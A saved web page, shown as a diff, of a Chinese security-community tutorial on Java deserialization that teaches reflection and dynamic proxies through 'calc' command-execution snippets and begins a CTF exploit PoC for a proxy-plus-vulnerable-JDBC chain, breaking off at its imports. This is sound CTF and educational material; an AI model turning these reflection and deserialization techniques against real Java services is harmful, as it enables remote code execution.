@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<!-- saved from url=(0028)https://xz.aliyun.com/t/9342 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>java反序列化知识总结和一些ctf的例题 - 先知社区</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
+    <link href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/editormd.min.css">
+    <link rel="stylesheet" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/tango.css">
+    <link href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
+    <!-- Le styles -->
+    <link rel="stylesheet" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/OverlayStyle.css">
+    <link rel="stylesheet" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/topic.css">
+    <link rel="stylesheet" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/beautify.css">
+    
+    <link rel="stylesheet" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/editormd.css">
+    <link rel="stylesheet" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/tango.css">
+    <link rel="stylesheet" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/jquery.fancybox.min.css">
+
+    <!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    
+    
+
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/jquery-2.1.3.min.js.下载"></script>
+    
+    
+    <script src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/jquery.fancybox.min.js.下载"></script>
+
+    <!-- <![endif]-->
+<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9342&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
+                    登录</a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1 text-right">
+                    <form method="get" action="https://xz.aliyun.com/search">
+                        <input type="text" placeholder="搜索" name="keyword">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+
+
+    <script src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/jquery.toc.min.js.下载"></script>
+    <script src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/toc.min.js.下载"></script>
+    <script src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/dt.js.下载"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">java反序列化知识总结和一些ctf的例题</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/36877">
+                        <span class="username cell"> 123qwer</span></a> <span class="i-seprator"> / </span>
+                    <span> 2021-03-30 18:54:48</span><span class="i-seprator"> / </span>
+                    
+                    <span>浏览数 12637</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="https://xz.aliyun.com/tab/4">社区板块</a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/13">CTF</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(9342);">
+             顶(2)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(9342);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <h2 id="toc-0">java反序列化知识总结和一些ctf的例题</h2>
+<h5>反序列化知识：</h5>
+<h6>对于web手来说，php的反序列化一定不陌生，php的反序列化一般关注的就是魔术方法的调用和动态函数的执行这些，在java这里对参数类型这些要求严格，所以不能像php那么轻松的挖掘反序列化链子，接下来就讲一些cc链里面用到的java的一些特性和一些比较高质量的java_ctf题。</h6>
+<h5>java的反射</h5>
+<h6>本身反射就是为了动态执行类方法，所以我们就可以利用达到命令执行，先来看看java正常命令执行</h6>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img0" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162852-cc71ca54-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162852-cc71ca54-8bb1-1.png"></a></p>
+<h6>为什么要通过<code>getRuntime()</code>来调用exec，而不是直接实例化Runtime呢？看看源码就知道了，发现是因为Runtime构造函数是私有的所以不能直接实例化，而是通过<code>getRuntime()</code>来进行构造，刚好又是静态方法，所以可以直接调用</h6>
+<p><a id="img1" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162853-cd4c6970-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162853-cd4c6970-8bb1-1.png"></a></p>
+<h6>但是不想通过getRuntime来得到对象，怎么办呢？这里就可以用到反射的第一个技巧了，利用反射来进行构造，通过这里我们就可以知道了，java可以通过反射来获取私有属性（也就是<code>constructor.setAccessible(true);</code>这就是为了设置可以获取和修改私有属性这些）。</h6>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="c1">//Runtime.getRuntime().exec("calc");</span>
+        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">);</span>
+        <span class="n">Constructor</span><span class="o">[]</span> <span class="n">constructors</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructors</span><span class="o">();</span>
+        <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">constructors</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">Runtime</span> <span class="n">rt</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runtime</span><span class="o">)</span><span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+        <span class="n">rt</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img2" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162855-ce5bbae6-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162855-ce5bbae6-8bb1-1.png"></a></p>
+<h6>现在我们再通过反射来调用<code>getRuntime()</code>再到exec来达到命令执行，这里需要注意一个地方，Method的invoke里面是一个类，而不是一个实例化的对象，主要原因是gt是源于getRuntime这个方法，而刚刚看到getRuntime是一个静态方法，所以这里也就不需要实例化了，这里就是cc链里面很多地方用到反射为什么要通过getRuntime来到exec了。</h6>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="c1">//Runtime.getRuntime().exec("calc");</span>
+        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">);</span>
+        <span class="n">Method</span> <span class="n">gt</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">);</span>
+        <span class="n">clazz</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">gt</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">clazz</span><span class="o">),</span><span class="s">"calc"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img3" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162855-ceab1320-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162855-ceab1320-8bb1-1.png"></a></p>
+<h6>我们还可以通过反射直接来调用exec执行命令</h6>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="c1">//Runtime.getRuntime().exec("calc");</span>
+        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">);</span>
+        <span class="n">Constructor</span><span class="o">[]</span> <span class="n">constructors</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructors</span><span class="o">();</span>
+        <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">constructors</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">clazz</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(),</span><span class="s">"calc"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img4" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162856-cf3c557e-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162856-cf3c557e-8bb1-1.png"></a></p>
+<h6>通过上面的例子我想对于反射来构造类应该没有什么问题了，当然在反射构造类时还有一个内部类的东西，这里就还是先把反射构造类讲完吧，需要注意的是私有内部类应该怎么构造，可以发现还是通过反射来构造，forName时里面是通过<code>$</code>来进行分隔的，还有就是newInstance时第一个参数得是这个类的实例化对象（如果不是私有内部类，这里第一个就是内部类对应构造方法的参数）。</h6>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">People</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">class</span> <span class="nc">Vuln</span><span class="o">{</span>
+        <span class="kd">private</span> <span class="n">String</span> <span class="n">inStr</span><span class="o">=</span><span class="s">"you don't control me"</span><span class="o">;</span>
+        <span class="kd">public</span>  <span class="nf">Vuln</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">){</span><span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">inStr</span><span class="o">+</span><span class="n">s</span><span class="o">);}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"People$Vuln"</span><span class="o">);</span>
+        <span class="n">Constructor</span><span class="o">[]</span> <span class="n">constructors</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructors</span><span class="o">();</span>
+        <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">constructors</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="k">new</span> <span class="n">People</span><span class="o">(),</span><span class="s">".Oh it easy?"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img5" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162857-cfe913f4-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162857-cfe913f4-8bb1-1.png"></a></p>
+<h6>好了，对于反射构造类基本差不多了，反射这里还有一个利用点就是通过反射来修改类的私有属性值，这个有什么用呢？在cc链里面对Hashmap进行put时会对key进行计算，这样就会修改我们加入的类的一些值，所以可以直接通过修改类的值来进行构造</h6>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">People</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">a</span><span class="o">=</span><span class="s">"only a?"</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">getA</span><span class="o">(){</span> <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">);</span> <span class="o">}</span>
+<span class="o">}</span>
+
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">NoSuchFieldException</span> <span class="o">{</span>
+        <span class="n">People</span> <span class="n">pl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">People</span><span class="o">();</span>
+        <span class="n">pl</span><span class="o">.</span><span class="na">getA</span><span class="o">();</span>
+        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"People"</span><span class="o">);</span>
+        <span class="n">Field</span> <span class="n">fd_a</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"a"</span><span class="o">);</span>
+        <span class="n">fd_a</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">fd_a</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">pl</span><span class="o">,</span><span class="s">"I can change it,,,"</span><span class="o">);</span>
+        <span class="n">pl</span><span class="o">.</span><span class="na">getA</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img6" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162858-d028a366-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162858-d028a366-8bb1-1.png"></a></p>
+<h6>那么对于java在构造poc中的反射已经差不多了，再来看看动态代理，可以发现动态代理这里主要是通过动态代理生成的类调用方法时首先会触发动态代理的invoke方法，这个在cc1的链子里面也出现过</h6>
+<div class="highlight"><pre><span></span><span class="n">People</span><span class="o">.</span><span class="na">java</span>
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">People</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">getA</span><span class="o">();</span>
+<span class="o">}</span>
+
+<span class="n">Man</span><span class="o">.</span><span class="na">java</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Man</span> <span class="kd">implements</span> <span class="n">People</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">getA</span><span class="o">(){</span> <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Maned"</span><span class="o">);}</span>
+
+<span class="o">}</span>
+
+<span class="n">PeopleHandler</span><span class="o">.</span><span class="na">java</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">PeopleHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="o">{</span>
+
+    <span class="kd">private</span> <span class="n">Object</span> <span class="n">target</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="nf">PeopleHandler</span><span class="o">(</span><span class="n">Object</span> <span class="n">pl</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">target</span><span class="o">=</span><span class="n">pl</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"invoked"</span><span class="o">);</span>
+        <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">target</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+
+<span class="n">test</span><span class="o">.</span><span class="na">java</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">NoSuchFieldException</span> <span class="o">{</span>
+        <span class="n">Man</span> <span class="n">man</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Man</span><span class="o">();</span>
+        <span class="n">PeopleHandler</span> <span class="n">pl_handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PeopleHandler</span><span class="o">(</span><span class="n">man</span><span class="o">);</span>
+        <span class="n">People</span> <span class="n">pl</span> <span class="o">=</span> <span class="o">(</span><span class="n">People</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">People</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span>
+                <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span><span class="n">People</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">pl_handler</span><span class="o">);</span>
+        <span class="n">pl</span><span class="o">.</span><span class="na">getA</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img7" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162859-d105307e-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162859-d105307e-8bb1-1.png"></a></p>
+<h5>ctf里面一些比较有意思的java题</h5>
+<h6>先来看看2020的羊城杯的java题吧，需要用到动态代理和反射的知识，也就是上面所讲的，动态代理实现的类在调用其他方法时会首先调用动态代理实现的invoke的方法，所以流程如下（通过动态代理的特性配合有漏洞版本的jdbc来达到命令执行）：</h6>
+<p><a id="img8" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162900-d14eabc8-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162900-d14eabc8-8bb1-1.png"></a><br>
+<a id="img9" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162900-d1804f70-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162900-d1804f70-8bb1-1.png"></a><br>
+<a id="img10" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162900-d1c1720c-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162900-d1c1720c-8bb1-1.png"></a><br>
+<a id="img11" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162901-d1e4aeb6-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162901-d1e4aeb6-8bb1-1.png"></a></p>
+<h6>所以构造poc：</h6>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">gdufs.challenge.web</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">gdufs.challenge.web.invocation.InfoInvocationHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">gdufs.challenge.web.model.DatabaseInfo</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">gdufs.challenge.web.model.Info</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
